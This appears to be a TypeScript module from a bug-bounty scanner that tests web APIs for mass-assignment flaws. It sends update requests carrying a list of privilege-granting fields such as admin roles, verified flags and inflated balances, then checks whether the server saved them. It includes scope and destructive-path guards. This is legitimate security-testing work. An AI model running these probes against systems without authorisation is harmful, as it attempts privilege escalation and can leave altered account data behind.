/* eslint-disable */
// Mass Assignment ( 過剰なフィールド代入 ) 検出。
// 戦略:
//   1. targetUrl の PUT / PATCH / POST 系の共通エンドポイントを probe
//   2. 元のボディに「特権を与えるフィールド」を追加して再送
//      ( role:admin / is_admin:true / verified:true / email_verified:true / permissions:["admin"] / role_id:1 )
//   3. レスポンスのステータスとボディを baseline と比較
//   4. 続いて GET ( 同じリソース ) を取って、特権フィールドが「実際に保存」されたかを確認
// 安全策:
//   - 1 リソース 1 試行のみ
//   - DELETE / 決済系 path は除外

import { chromium } from "playwright";
import { isUrlInScope } from "@/lib/scope";
import { maskBody } from "@/lib/mask";
import { makeScanCtx, createScanFinding, findExistingScanFinding } from "@/lib/scan-adapter";

const PRIVILEGE_FIELDS: Record<string, unknown> = {
  role: "admin",
  roles: ["admin"],
  role_id: 1,
  roleId: 1,
  is_admin: true,
  isAdmin: true,
  admin: true,
  is_staff: true,
  isStaff: true,
  is_superuser: true,
  isSuperuser: true,
  superuser: true,
  is_owner: true,
  isOwner: true,
  is_verified: true,
  isVerified: true,
  verified: true,
  email_verified: true,
  emailVerified: true,
  is_active: true,
  isActive: true,
  permissions: ["admin", "write", "delete"],
  scopes: ["admin"],
  user_type: "admin",
  userType: "admin",
  account_type: "premium",
  accountType: "premium",
  plan: "enterprise",
  subscription: "enterprise",
  balance: 999999,
  credits: 999999,
  organization_id: 1,
  organizationId: 1,
  tenant_id: 1,
  tenantId: 1
};

const FORBIDDEN_PATH = /\/(?:delete|destroy|remove|wipe|charge|payment|invoice|withdraw|transfer)\b/i;

// Common update endpoints to probe
const CANDIDATE_PATHS = [
  "/api/user",
  "/api/users/me",
  "/api/profile",
  "/api/account",
  "/api/settings",
  "/api/me",
  "/user/profile",
  "/account/settings",
  "/api/v1/user",
  "/api/v1/profile"
];

// Minimal JSON body to use as baseline for POST/PUT/PATCH
const BASELINE_BODY = { name: "test-user" };

async function fetchWithMethod(url: string, method: string, body: object, contentType: string): Promise<{ status: number; body: string }> {
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await context.newPage();
    const res = await page.request.fetch(url, {
      method,
      data: JSON.stringify(body),
      headers: { "content-type": contentType },
      failOnStatusCode: false,
      timeout: 10000
    });
    const respBody = await res.text().catch(() => "");
    await context.close();
    return { status: res.status(), body: respBody.slice(0, 4000) };
  } finally {
    await browser.close();
  }
}

async function fetchGet(url: string): Promise<{ status: number; body: string } | null> {
  try {
    const browser = await chromium.launch({ headless: true });
    try {
      const context = await browser.newContext({ ignoreHTTPSErrors: true });
      const page = await context.newPage();
      const res = await page.request.fetch(url, { method: "GET", failOnStatusCode: false, timeout: 10000 });
      const body = await res.text().catch(() => "");
      await context.close();
      return { status: res.status(), body: body.slice(0, 4000) };
    } finally {
      await browser.close();
    }
  } catch { return null; }
}

function findPersistedFields(getBody: string, mutationFields: Record<string, unknown>): string[] {
  const persisted: string[] = [];
  let parsed: any = null;
  try { parsed = JSON.parse(getBody); } catch { /* not JSON, fall back to substring */ }
  for (const [k, v] of Object.entries(mutationFields)) {
    if (parsed && typeof parsed === "object") {
      const candidates = [parsed, parsed.data, parsed.user, parsed.record, parsed.result, parsed.attributes];
      for (const obj of candidates) {
        if (!obj || typeof obj !== "object") continue;
        if (k in obj) {
          const stored = obj[k];
          if (JSON.stringify(stored) === JSON.stringify(v)) {
            persisted.push(k);
            break;
          }
        }
      }
    } else {
      if (typeof v === "string" || typeof v === "number" || typeof v === "boolean") {
        const needle = `"${k}"`;
        const valueStr = JSON.stringify(v);
        if (getBody.includes(needle) && getBody.includes(valueStr)) persisted.push(k);
      }
    }
  }
  return persisted;
}

export async function runMassAssignmentCheck(scanId: string, targetUrl: string) {
  const program = makeScanCtx(scanId, targetUrl);
  const base = new URL(targetUrl).origin;

  let count = 0;
  const tested = new Set<string>();

  for (const path of CANDIDATE_PATHS) {
    if (count >= 6) break;
    const candidateUrl = `${base}${path}`;
    if (!isUrlInScope(program, candidateUrl).allowed) continue;
    if (FORBIDDEN_PATH.test(path)) continue;
    if (tested.has(candidateUrl)) continue;
    tested.add(candidateUrl);

    for (const method of ["PUT", "PATCH", "POST"]) {
      if (count >= 6) break;
      try {
        const ct = "application/json";
        const originalBody = BASELINE_BODY;
        // Build mutated body with privilege fields (up to 4)
        const mutated = { ...originalBody };
        const fieldsApplied: Record<string, unknown> = {};
        for (const [k, v] of Object.entries(PRIVILEGE_FIELDS)) {
          mutated[k as keyof typeof mutated] = v as never;
          fieldsApplied[k] = v;
          if (Object.keys(fieldsApplied).length >= 4) break;
        }

        const baseline = await fetchWithMethod(candidateUrl, method, originalBody, ct);
        // Only proceed if server responds to baseline at all (not 404/405 etc.)
        if (baseline.status === 404 || baseline.status === 405 || baseline.status === 0) continue;

        const mutatedRes = await fetchWithMethod(candidateUrl, method, mutated, ct);
        const mutationAccepted = mutatedRes.status >= 200 && mutatedRes.status < 300;
        if (!mutationAccepted) continue;

        // Confirm persistence via GET
        const getRes = await fetchGet(candidateUrl);
        const persisted = getRes ? findPersistedFields(getRes.body, fieldsApplied) : [];
        if (persisted.length === 0) continue;

        const severity: "critical" | "high" | "medium" = persisted.some((k) => /admin|owner|superuser|staff/i.test(k)) ? "critical" : persisted.some((k) => /verified|active|premium|enterprise/i.test(k)) ? "high" : "medium";
        const sevLabel = severity === "critical" ? "Critical" : severity === "high" ? "High" : "Medium";
        const taggedType = `Mass Assignment 候補 (${persisted.slice(0, 2).join(", ")}) [${sevLabel}]`;
        const target = `${method} ${base}${path}`;
        const existing = await findExistingScanFinding(scanId, taggedType, target);
        if (existing) continue;

        await createScanFinding(scanId, {
          type: taggedType,
          target,
          severity,
          impact: `${target} の JSON ボディに特権フィールド ( ${Object.keys(fieldsApplied).join(", ")} ) を追加して送信したところ、サーバーがリクエストを ${mutatedRes.status} で受け入れ、続く GET で ${persisted.join(", ")} がレスポンスに保存されていることが確認できました。攻撃者は本エンドポイント経由で自身を管理者にしたり、検証済みステータスを得たり、有料プランに昇格するといった権限昇格 ( Mass Assignment ) が可能です。`,
          inScopeReason: `収集済み許可ドメイン内の write エンドポイント`,
          evidence: `url=${candidateUrl}, method=${method}, fieldsApplied=${Object.keys(fieldsApplied).join(",")}, persistedFields=${persisted.join(",")}, mutationStatus=${mutatedRes.status}, getStatus=${getRes?.status}`,
          requestResponseDiff: maskBody("application/json", JSON.stringify({
            method,
            url: candidateUrl,
            originalBodyKeys: Object.keys(originalBody),
            fieldsApplied,
            persistedFields: persisted,
            baselineStatus: baseline.status,
            mutatedStatus: mutatedRes.status,
            getStatus: getRes?.status,
            getBodyPreview: getRes?.body?.slice(0, 500),
            safetyNote: "DELETE / 決済 path は除外。同一リソースに対し ( baseline 1 回 + mutation 1 回 + GET 1 回 ) の 3 リクエストのみ送信。"
          }, null, 2)),
          reproductionSteps: `1. baseline: ${method} ${candidateUrl} で元のボディを送信 → status ${baseline.status}\n2. mutation: 同 URL に追加フィールド ${JSON.stringify(fieldsApplied)} を含む body を送信 → status ${mutatedRes.status}\n3. confirmation: GET ${candidateUrl} → ${persisted.join(", ")} がレスポンスに保存されていることを確認\n4. 攻撃者は同様の手順で自身に admin / 検証済 / 有料プラン等を付与可能`,
          aiWorthSending: severity === "critical" ? "Critical: admin/owner/superuser フィールドが書き込めるため即権限昇格。報告候補。" : severity === "high" ? "High: 検証済み / 有料プラン等の不正取得が可能。報告候補。" : "影響範囲を人間が確認してください。",
          bountyLikelihood: severity === "critical" ? "very_high" : severity === "high" ? "high" : "medium",
          recommendedAction: severity === "critical" ? "report_now" : "manual_verify"
        });
        count++;
      } catch { /* skip */ }
    }
  }
  return count;
}
